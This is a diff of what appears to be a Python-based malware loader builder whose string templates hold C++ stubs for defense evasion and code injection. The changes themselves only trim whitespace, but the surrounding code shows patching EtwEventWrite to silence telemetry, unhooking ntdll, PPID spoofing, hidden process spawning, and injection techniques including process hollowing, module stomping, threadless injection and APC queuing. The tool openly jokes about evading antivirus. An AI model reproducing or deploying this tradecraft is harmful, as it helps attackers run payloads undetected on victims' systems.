@@ -10,8 +10,8 @@ inspiration = """
 ┳┻|
 ┻┳|
 ┳┻| _
-┻┳| •.•)  - Shhhhh, AV might hear us! 
-┳┻|⊂ﾉ   
+┻┳| •.•)  - Shhhhh, AV might hear us!
+┳┻|⊂ﾉ
 ┻┳|
 """
 
@@ -25,7 +25,7 @@ stub = """
 #include <tchar.h>
 #include "skCrypter.h"
 REPLACE_ME_SYSCALL_INCLUDE
-#ifndef UNICODE  
+#ifndef UNICODE
 typedef std::string String;
 #else
 typedef std::wstring String;
@@ -451,7 +451,7 @@ char NtOpenSec[] = { 'N','t','O','p','e','n','S','e','c','t','i','o','n', 0 };
 myNtMapViewOfSection NtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(Nt), NtMapVOS));
 myNtOpenSection NtOpenSection = (myNtOpenSection)(GetProcAddress(GetModuleHandleA(Nt), NtOpenSec));
 
-// Init vars for other API functions, will define after we have a chance to unhook ntdll 
+// Init vars for other API functions, will define after we have a chance to unhook ntdll
 myNtAllocateVirtualMemory NtAllocateVirtualMemory;
 myNtWriteVirtualMemory NtWriteVirtualMemory;
 myNtProtectVirtualMemory NtProtectVirtualMemory;
@@ -604,7 +604,7 @@ int PrintModules(DWORD processID)
                     //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                     return 2;
                 }
-                
+
             }
         }
     }
@@ -794,11 +794,11 @@ PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
     InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
     si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
     InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
-    
+
     DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
     UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
     REPLACE_PPID_SPOOF
-    
+
     si.StartupInfo.cb = sizeof(si);
     si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT | STARTF_USESHOWWINDOW;
     si.StartupInfo.wShowWindow = SW_HIDE;
@@ -862,7 +862,7 @@ BOOL DisableETW(void) {
     char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
     char sntdll[] = { 'n','t','d','l','l', 0 };
 
-    //      xor rax, rax; 
+    //      xor rax, rax;
     //      ret
     char patch[] = { 0x48, 0x33, static_cast<char> (0xc0), static_cast<char> (0xc3) };
 
@@ -909,7 +909,7 @@ LPVOID MapNtdll() {
         safe_print(skCrypt("[!] Failed in NtOpenSection (%u)\\n"), GetLastError());
         return NULL;
     }
-    
+
     PVOID pntdll = NULL;
     ULONG_PTR ViewSize = NULL;
     PVOID JUNKVAR = NULL;
@@ -1019,7 +1019,7 @@ UINT_PTR findMemoryHole(HANDLE proc, UINT_PTR exportAddr, SIZE_T size)
 
     return foundMem ? remoteLdrAddr : 0;
 }
-//END THREADLESS 
+//END THREADLESS
 """
 
 threadless_inject_create_stub = """
@@ -1203,12 +1203,12 @@ module_stomping_stub = """
     PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
-    
+
     processHandle = pi.hProcess;
 
     LPVOID test = (LPVOID)GetProcAddress(LoadLibraryA(TEXT("Kernel32.dll")), skCrypt("LoadLibraryExA"));
     unsigned char adr[8];
-    *(uintptr_t*)adr = (uintptr_t)test; 
+    *(uintptr_t*)adr = (uintptr_t)test;
 
     unsigned char shim[] =  {0x48, 0xB8, adr[0], adr[1], adr[2], adr[3], adr[4], adr[5], adr[6],adr[7],
             0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
@@ -1227,7 +1227,7 @@ module_stomping_stub = """
     safe_print(skCrypt("NtAllocateVirtualMemory res (allocModule): "), res);
     res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     safe_print(skCrypt("NtAllocateVirtualMemory res (allocShim): "), res);
-    
+
     auto eString = skCrypt("allocShim:   ");
     printf("%s%#p\\n", eString.decrypt(), allocShim);
     eString.clear();
@@ -1351,7 +1351,7 @@ process_hollow_stub = """
     PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
-    
+
     HANDLE hProcess = pi.hProcess;
     HANDLE hThread = pi.hThread;
     PROCESS_BASIC_INFORMATION bi;
@@ -1410,7 +1410,7 @@ process_hollow_stub = """
     else{
         safe_print(skCrypt("NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully."));
     }
-    
+
     uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
     //std::cout << "e_lfanew: " << e_lfanew << std::endl;
     uint32_t entrypointRvaOffset = e_lfanew + 0x28;
@@ -1545,7 +1545,7 @@ CurrentThread_stub = """
         safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
     }
 
-    res = NewNtWaitForSingleObject(thandle, -1, NULL);   
+    res = NewNtWaitForSingleObject(thandle, -1, NULL);
 """
 
 EnumDisplayMonitors_stub = """
@@ -1621,7 +1621,7 @@ QueueUserAPC_stub = """
     PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
-    
+
     HANDLE hProcess = pi.hProcess;
     HANDLE hThread = pi.hThread;
 
@@ -1816,7 +1816,7 @@ RemoteThreadContext_stub = """
     PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
-    
+
     HANDLE hProcess = pi.hProcess;
 
     res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -1950,7 +1950,7 @@ unhook_call = """
         safe_print(skCrypt("Failed to map NTDLL"));
         return -1;
     }
-    
+
 
     if (!Unhook(nt)) {
         safe_print(skCrypt("Failed in Unhooking!"));
